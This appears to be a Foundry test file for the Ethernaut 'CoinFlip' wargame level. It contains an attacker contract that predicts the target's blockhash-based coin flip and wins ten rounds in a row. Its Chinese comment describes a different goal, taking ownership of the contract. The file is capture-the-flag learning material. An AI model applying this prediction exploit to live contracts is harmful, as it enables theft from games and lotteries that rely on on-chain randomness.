// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

/* 
获得以下合约的所有权来完成这一关
*/

contract CoinFlipAttack {
    CoinFlip cf;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _CoinFlip) {
        cf = CoinFlip(_CoinFlip);
    }

    function exploit() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        cf.flip(side);
    }
}

contract CoinFlipTest is Test {
    CoinFlip public cf;
    CoinFlipAttack public cfAttack;

    address alice = address(1);

    function setUp() public {
        cf = new CoinFlip();
        cfAttack = new CoinFlipAttack(cf);
    }

    function testAttack() public {
        assertEq(cf.consecutiveWins(), 0);

        for (uint256 i = 0; i < 10; i++) {
            vm.roll(i + 1);
            cfAttack.exploit();
        }

        assertEq(cf.consecutiveWins(), 10);
    }
}
